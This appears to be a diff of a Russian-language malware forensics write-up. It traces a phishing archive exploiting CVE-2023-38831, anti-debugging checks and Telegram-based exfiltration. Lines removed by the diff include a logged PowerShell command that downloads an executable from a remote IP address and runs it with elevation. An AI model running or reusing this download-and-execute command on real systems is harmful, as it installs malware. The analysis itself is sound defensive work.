@@ -1,39 +1,22 @@
+Посмотрим на машинку беглым взглядом. В %AppData% находим некий `Rjomba.exe`, дата его создания **3 марта 18:43**. Посмотрим события в Windows в `eventvwr.msc` в это время. Во вкладке PowerShell находим команду, которая с удаленного сервера скачивает и запускает этот самый `Rjomba.exe`. 
+
+![1234.png](1234.png "Ивент")
+
+По легенде, пришло фишинговое письмо, откуда было запущено ВПО. Проверим историю браузеров. В **Edge** замечаем некий `TOP_SECRET.pdf` в архиве, который был удален. Попробуем восстановить этот архив, запустим любую программу по восстановлению файлов, в данном случае мы воспользовались программой от EaseUS. Там мы увидели файл `TOP_SECRET.pdf` и папку `TOP_SECRET.pdf`, в которой лежал `TOP_SECRET.pdf.cmd`. Как известно, Windows умеет опускать `.bat`, `.exe` и `.cmd`, а в `.cmd` как раз лежит команда для PowerShell. Именно таким образом и было получено и запущено ВПО.
+
+![top_secret.png](top_secret.png "Ивент")
+
 # 1 Как ВПО попало на компьютер?
-Через спам рассылку на почту
+Через фишинговое письмо
 
 # 2 С какого сервера?
-Посмотрев события винды видим откуда был скачан файл:
+http://95.169.192.220:8080
 
-ip: http://95.169.192.220:8080
-Logfile:
-
-```
-file:///C:/Users/Evgeniy/AppData/Local/Temp/Rar$DIa2900.6159/TOP_SECRET.pdf
-Trojan:Win32/Znyonm
-Поставщик "Registry" находится в состоянии Started. 
-
-Подробные сведения: 
-	ProviderName=Registry
-	NewProviderState=Started
-
-	SequenceNumber=1
-
-	HostName=ConsoleHost
-	HostVersion=5.1.19041.906
-	HostId=9da22629-af52-4b50-a1e3-c0b8ad39c1a1
-	HostApplication=powershell -command ($drop=Join-Path -Path $env:APPDATA -ChildPath Rjomba.exe);(New-Object System.Net.WebClient).DownloadFile('http://95.169.192.220:8080/prikol.exe', $drop); Start-Process -Verb runAs $drop
-	EngineVersion=
-	RunspaceId=
-	PipelineId=
-	CommandName=
-	CommandType=
-	ScriptName=
-	CommandPath=
-	CommandLine=
-```
-3. С помощью какой уязвимости данное ВПО запустилось? В каком ПО?
-
+# 3. С помощью какой уязвимости данное ВПО запустилось? В каком ПО?
 Уязвимость: CVE-2023-38831, [https://habr.com/ru/articles/797127/](https://habr.com/ru/articles/797127/)
+Присуща архиваторам, сам скрипт был запущен в PowerShell
+
+Попытавшись запустить программу с дебаггером, она выключается. Посмотрев на действия программы до её закрытия, находим, как именно она определяет наличие откладчика
 
 # 4 Какие методы противодействия отладке использует программа? 
 
@@ -49,5 +32,5 @@ isDebuggerPresent() возвращает true, если программа в д
 Генерация рандомных чисел
 
 # 7
-Вирус отсылает данные на бота через api телеграмма
+Вирус отсылает данные на бота через API телеграмма
 ![link.png](link.png "win!")
